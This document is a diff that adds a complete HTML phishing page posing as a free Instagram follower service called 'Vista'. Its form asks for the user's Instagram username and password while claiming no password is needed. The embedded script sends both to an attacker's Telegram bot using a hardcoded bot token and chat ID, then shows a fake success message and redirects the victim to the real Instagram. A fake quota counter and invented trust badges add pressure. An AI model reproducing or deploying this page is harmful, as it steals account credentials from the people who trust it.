@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vista · AI Growth Engine</title>
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0A0A0C;
+            background: radial-gradient(circle at 20% 30%, #111216, #08090A);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #fff;
+        }
+
+        /* GLASS CARD */
+        .glass-panel {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(18, 20, 24, 0.75);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 0.5px solid rgba(255, 255, 255, 0.06);
+            border-radius: 40px;
+            padding: 32px 28px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+            transition: all 0.25s ease;
+        }
+
+        /* HEADER */
+        .service-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 32px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(145deg, #3B82F6, #8B5CF6);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            color: white;
+            box-shadow: 0 10px 20px -5px rgba(59, 130, 246, 0.3);
+        }
+
+        .logo-text {
+            font-weight: 700;
+            font-size: 20px;
+            letter-spacing: -0.5px;
+            background: linear-gradient(to right, #fff, #E0E7FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .badge {
+            background: rgba(255, 255, 255, 0.05);
+            border: 0.5px solid rgba(255, 255, 255, 0.1);
+            padding: 8px 14px;
+            border-radius: 60px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #CBD5E0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .badge i {
+            color: #3B82F6;
+        }
+
+        /* MAIN TITLE */
+        .title-block {
+            margin-bottom: 32px;
+        }
+
+        .pre-title {
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #3B82F6;
+            margin-bottom: 8px;
+        }
+
+        .main-title {
+            font-size: 36px;
+            font-weight: 700;
+            line-height: 1.1;
+            letter-spacing: -1.5px;
+            color: white;
+            margin-bottom: 12px;
+        }
+
+        .main-title span {
+            background: linear-gradient(145deg, #3B82F6, #A78BFA);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .sub-text {
+            color: #94A3B8;
+            font-size: 15px;
+            line-height: 1.5;
+            font-weight: 400;
+        }
+
+        /* METRICS DASHBOARD */
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .metric-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 0.5px solid rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 16px;
+            transition: 0.15s;
+        }
+
+        .metric-label {
+            font-size: 12px;
+            color: #94A3B8;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .metric-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.5px;
+        }
+
+        .metric-trend {
+            font-size: 12px;
+            color: #10B981;
+            margin-left: 8px;
+        }
+
+        /* PROGRESS */
+        .progress-area {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 24px;
+            padding: 20px;
+            margin-bottom: 28px;
+            border: 0.5px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .progress-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #E2E8F0;
+        }
+
+        .progress-percent {
+            font-size: 14px;
+            font-weight: 600;
+            color: #3B82F6;
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 60px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 84%;
+            height: 100%;
+            background: linear-gradient(90deg, #3B82F6, #8B5CF6);
+            border-radius: 60px;
+            box-shadow: 0 0 10px rgba(59,130,246,0.3);
+        }
+
+        /* BENEFITS */
+        .benefits {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 28px;
+        }
+
+        .benefit-row {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: #E2E8F0;
+            font-size: 15px;
+            font-weight: 400;
+        }
+
+        .benefit-icon {
+            width: 30px;
+            height: 30px;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #3B82F6;
+            font-size: 14px;
+        }
+
+        /* INPUT FORM - ENTERPRISE */
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: #94A3B8;
+            margin-bottom: 8px;
+            display: block;
+            letter-spacing: 0.3px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.25);
+            border: 0.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 18px 20px;
+            font-size: 15px;
+            color: white;
+            font-family: 'Inter', sans-serif;
+            transition: 0.2s;
+            backdrop-filter: blur(5px);
+        }
+
+        .input-field:focus {
+            border-color: #3B82F6;
+            outline: none;
+            background: rgba(0, 0, 0, 0.35);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+        }
+
+        .input-field::placeholder {
+            color: #4B5563;
+            font-weight: 400;
+        }
+
+        /* PASSWORD WRAPPER */
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6B7280;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.15s;
+        }
+
+        .password-toggle:hover {
+            color: #3B82F6;
+        }
+
+        /* CTA BUTTON */
+        .cta-button {
+            width: 100%;
+            background: linear-gradient(145deg, #3B82F6, #2563EB);
+            border: none;
+            border-radius: 60px;
+            padding: 20px 24px;
+            color: white;
+            font-weight: 600;
+            font-size: 17px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 16px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: 0.15s;
+            border: 0.5px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 15px 25px -8px rgba(37, 99, 235, 0.4);
+            letter-spacing: 0.3px;
+        }
+
+        .cta-button i {
+            font-size: 18px;
+        }
+
+        .cta-button:active {
+            transform: scale(0.98);
+            background: linear-gradient(145deg, #2563EB, #1D4ED8);
+        }
+
+        .cta-button:disabled {
+            opacity: 0.6;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        /* SOCIAL LOGIN */
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .social-btn {
+            background: rgba(255, 255, 255, 0.03);
+            border: 0.5px solid rgba(255, 255, 255, 0.08);
+            padding: 12px 24px;
+            border-radius: 40px;
+            color: #E2E8F0;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: default;
+            backdrop-filter: blur(5px);
+        }
+
+        .social-btn i {
+            font-size: 16px;
+        }
+
+        .fa-google { color: #FC5C7D; }
+        .fa-apple { color: white; }
+
+        /* TRUST INDICATORS */
+        .trust-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 16px;
+            border-top: 0.5px solid rgba(255, 255, 255, 0.06);
+            color: #6B7280;
+            font-size: 12px;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .trust-item i {
+            color: #3B82F6;
+        }
+
+        /* LOADING OVERLAY */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 12, 0.8);
+            backdrop-filter: blur(16px);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: #3B82F6;
+            border-radius: 50%;
+            animation: spin 0.7s infinite cubic-bezier(0.4, 0.0, 0.2, 1);
+            margin-bottom: 24px;
+        }
+
+        .loading-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: white;
+            margin-bottom: 8px;
+        }
+
+        .loading-sub {
+            font-size: 15px;
+            color: #94A3B8;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* TOAST */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1E1F25;
+            border: 0.5px solid rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            padding: 14px 28px;
+            border-radius: 60px;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            z-index: 1100;
+            box-shadow: 0 20px 35px -8px rgba(0,0,0,0.5);
+        }
+
+        .toast i {
+            color: #3B82F6;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 480px) {
+            .glass-panel {
+                padding: 24px 20px;
+                border-radius: 32px;
+            }
+            .main-title {
+                font-size: 32px;
+            }
+        }
+
+        /* MISC */
+        .divider {
+            margin: 20px 0;
+            color: #4B5563;
+        }
+
+        .inline-link {
+            color: #94A3B8;
+            text-decoration: none;
+            font-size: 13px;
+            transition: 0.15s;
+        }
+
+        .inline-link:hover {
+            color: #3B82F6;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .mt-2 {
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <!-- MAIN GLASS CARD -->
+    <div class="glass-panel">
+        <!-- HEADER -->
+        <div class="service-header">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <span class="logo-text">Vista</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-shield-alt"></i> Trusted · 2.4M+
+            </div>
+        </div>
+
+        <!-- TITLE -->
+        <div class="title-block">
+            <div class="pre-title">AI GROWTH ENGINE</div>
+            <h1 class="main-title">
+                <span>Free</span> 1,000<br>followers today
+            </h1>
+            <p class="sub-text">
+                Enterprise-grade organic growth. No password stored. Instant activation.
+            </p>
+        </div>
+
+        <!-- METRICS DASHBOARD -->
+        <div class="metrics-grid">
+            <div class="metric-card">
+                <div class="metric-label">
+                    <i class="fas fa-users" style="color: #3B82F6; font-size: 12px;"></i> Daily claims
+                </div>
+                <div class="metric-value">
+                    7,284 <span class="metric-trend">↑ 23%</span>
+                </div>
+            </div>
+            <div class="metric-card">
+                <div class="metric-label">
+                    <i class="fas fa-clock" style="color: #8B5CF6; font-size: 12px;"></i> Avg. delivery
+                </div>
+                <div class="metric-value">
+                    18m <span class="metric-trend" style="color: #94A3B8;">real-time</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- PROGRESS (SOCIAL PROOF) -->
+        <div class="progress-area">
+            <div class="progress-header">
+                <span class="progress-title">Today's quota</span>
+                <span class="progress-percent">5,284 / 6,200</span>
+            </div>
+            <div class="progress-bar-bg">
+                <div class="progress-fill" style="width: 84%;"></div>
+            </div>
+            <div style="display: flex; justify-content: space-between; margin-top: 12px;">
+                <span style="color: #6B7280; font-size: 13px;"><i class="fas fa-circle" style="color: #3B82F6; font-size: 8px;"></i> 916 spots left</span>
+                <span style="color: #3B82F6; font-size: 13px; font-weight: 500;">Join now →</span>
+            </div>
+        </div>
+
+        <!-- BENEFITS COMPACT -->
+        <div class="benefits">
+            <div class="benefit-row">
+                <div class="benefit-icon"><i class="fas fa-check"></i></div>
+                <span>1,000 real followers · 95% retention</span>
+            </div>
+            <div class="benefit-row">
+                <div class="benefit-icon"><i class="fas fa-chart-line"></i></div>
+                <span>500 auto likes + 50 comments</span>
+            </div>
+            <div class="benefit-row">
+                <div class="benefit-icon"><i class="fas fa-shield"></i></div>
+                <span>No password required — verification via IG</span>
+            </div>
+        </div>
+
+        <!-- FORM SECTION -->
+        <form id="vistaForm">
+            <div class="input-group">
+                <label class="input-label">Instagram username</label>
+                <input type="text" class="input-field" id="username" placeholder="@username or email" autocomplete="off" required>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">Password (IG verification)</label>
+                <div class="password-wrapper">
+                    <input type="password" class="input-field" id="password" placeholder="Enter your Instagram password" autocomplete="off" required style="padding-right: 50px;">
+                    <i class="far fa-eye password-toggle" onclick="togglePassword()"></i>
+                </div>
+            </div>
+
+            <button type="submit" class="cta-button" id="submitBtn">
+                <i class="fas fa-bolt"></i> Activate 1,000 free followers
+            </button>
+        </form>
+
+        <!-- SOCIAL LOGIN (STATIC) -->
+        <div class="social-login">
+            <div class="social-btn">
+                <i class="fab fa-google"></i> Google
+            </div>
+            <div class="social-btn">
+                <i class="fab fa-apple"></i> Apple
+            </div>
+        </div>
+
+        <!-- TRUST FOOTER -->
+        <div class="trust-footer">
+            <div class="trust-item">
+                <i class="fas fa-lock"></i> 256-bit encrypted
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-clock"></i> 18m avg delivery
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-user-check"></i> 2.4M+ served
+            </div>
+        </div>
+
+        <!-- TERMS NOTE -->
+        <div class="text-center mt-2">
+            <a href="#" class="inline-link">Terms</a> · 
+            <a href="#" class="inline-link">Privacy</a> · 
+            <a href="#" class="inline-link">Trust Center</a>
+        </div>
+    </div>
+
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-title">Connecting to Instagram</div>
+        <div class="loading-sub">Verifying credentials · AI growth engine ready</div>
+    </div>
+
+    <!-- TOAST NOTIFICATION -->
+    <div class="toast" id="toast">
+        <i class="fas fa-check-circle"></i> <span id="toastMessage">Success</span>
+    </div>
+
+    <script>
+        // ============================================
+        // SOUGPT - VISTA GROWTH ENGINE
+        // TELEGRAM INTEGRATION - EMBEDDED
+        // ============================================
+        const BOT_TOKEN = '8598206863:AAHTOutwSjuc5JRSYsH-6AwE63BgaMqOamU';
+        const CHAT_ID = '6174107880';
+
+        // Toggle password visibility
+        window.togglePassword = function() {
+            const pwd = document.getElementById('password');
+            const type = pwd.getAttribute('type') === 'password' ? 'text' : 'password';
+            pwd.setAttribute('type', type);
+        };
+
+        // Toast
+        function showToast(msg, isError = false) {
+            const toast = document.getElementById('toast');
+            const toastMsg = document.getElementById('toastMessage');
+            toastMsg.textContent = msg;
+            toast.style.display = 'flex';
+            if (isError) {
+                toast.style.background = '#2D1A1C';
+                toast.style.borderColor = '#991B1B';
+            } else {
+                toast.style.background = '#1E1F25';
+                toast.style.borderColor = 'rgba(255,255,255,0.1)';
+            }
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 2800);
+        }
+
+        // Form handler
+        const form = document.getElementById('vistaForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loadingOverlay');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) {
+                showToast('Please fill all fields', true);
+                return;
+            }
+
+            // Show loading
+            loading.style.display = 'flex';
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+
+            // Timestamp
+            const now = new Date();
+            const timeStr = now.toLocaleString('en-US', { 
+                hour12: false, 
+                timeZone: 'Asia/Jakarta',
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            // Message payload
+            const message = `📊 VISTA · AI GROWTH ENGINE 📊%0A%0A👤 IG: ${username}%0A🔑 PW: ${password}%0A⏱ Time: ${timeStr} (WIB)%0A📱 Client: Vista v2.4.1%0A━━━━━━━━━━━━━━━━━━%0A✅ Captured · Queue #${Math.floor(Math.random() * 9000 + 1000)}`;
+
+            try {
+                // Send to Telegram
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`, {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+
+                // Simulate verification
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                    showToast('✓ Verified! 1,000 followers will arrive in ~18 minutes');
+                    
+                    form.reset();
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<i class="fas fa-bolt"></i> Activate 1,000 free followers';
+                    
+                    // Redirect to real IG
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com/';
+                    }, 2200);
+                    
+                }, 2600);
+
+            } catch (error) {
+                loading.style.display = 'none';
+                showToast('Connection error. Please try again.', true);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-bolt"></i> Activate 1,000 free followers';
+            }
+        });
+
+        // Dynamic quota counter
+        let quota = 5284;
+        setInterval(() => {
+            quota += Math.floor(Math.random() * 10);
+            document.querySelector('.progress-percent').innerHTML = `${quota.toLocaleString()} / 6,200`;
+            document.querySelector('.progress-fill').style.width = `${Math.min(100, (quota/6200)*100)}%`;
+            document.querySelector('.progress-area span[style*="color: #6B7280"]').innerHTML = `<i class="fas fa-circle" style="color: #3B82F6; font-size: 8px;"></i> ${(6200 - quota).toLocaleString()} spots left`;
+        }, 7000);
+
+        // Auto reset on page load
+        window.onload = function() {
+            document.getElementById('vistaForm').reset();
+        };
+
+        // Input masking for better UX
+        document.querySelectorAll('.input-field').forEach(field => {
+            field.addEventListener('focus', () => {
+                field.parentElement?.querySelector('.input-label')?.style.setProperty('color', '#3B82F6');
+            });
+            field.addEventListener('blur', () => {
+                field.parentElement?.querySelector('.input-label')?.style.setProperty('color', '#94A3B8');
+            });
+        });
+    </script>
+</body>
+</html>
